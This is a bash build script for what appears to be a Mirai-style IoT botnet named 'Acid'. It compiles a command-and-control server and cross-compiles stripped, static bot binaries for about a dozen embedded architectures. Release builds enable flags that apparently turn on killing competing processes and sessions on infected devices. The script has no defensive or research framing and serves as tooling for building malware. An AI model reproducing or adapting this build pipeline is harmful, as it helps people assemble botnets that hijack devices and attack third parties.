#!/bin/bash
function compile_bot {
    export PATH=$PATH:/root/$5/cross-compilers/$1/bin
    "$1-gcc" -std=c99 bot/*.c -o bins/"$2" $4 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections
    "$1-strip" bins/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt $3
    echo -ne "\033[37mfinished compiling \033[96m[\033[37m$2\033[96m]\033[0m\r\n"
}
if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release>"
elif [ "$1" == "debug" ]; then
    gcc -std=c99 cnc/*.c -o c2/cnc -lpthread
    echo -ne "\033[37mfinished compiling \033[96m[\033[37mcnc\033[96m]\r\n"
    compile_bot x86_64 Acid.dbg "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DDEBUG" $2
elif [ "$1" == "release" ]; then
    compile_bot armv4l Acid.arm "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot armv5l Acid.arm5 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot armv6l Acid.arm6 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot armv7l Acid.arm7 "" "-DKILLER -DKILL_SESSION" $2
    compile_bot m68k Acid.m68k "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot mips Acid.mips "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot mipsel Acid.mpsl "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot powerpc Acid.ppc "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot sh4 Acid.sh4 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot sparc Acid.spc "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-DKILLER -DKILL_SESSION" $2
    compile_bot x86_64 Acid.x86 "--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr" "-Dx86_64 -DKILLER" $2
    
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
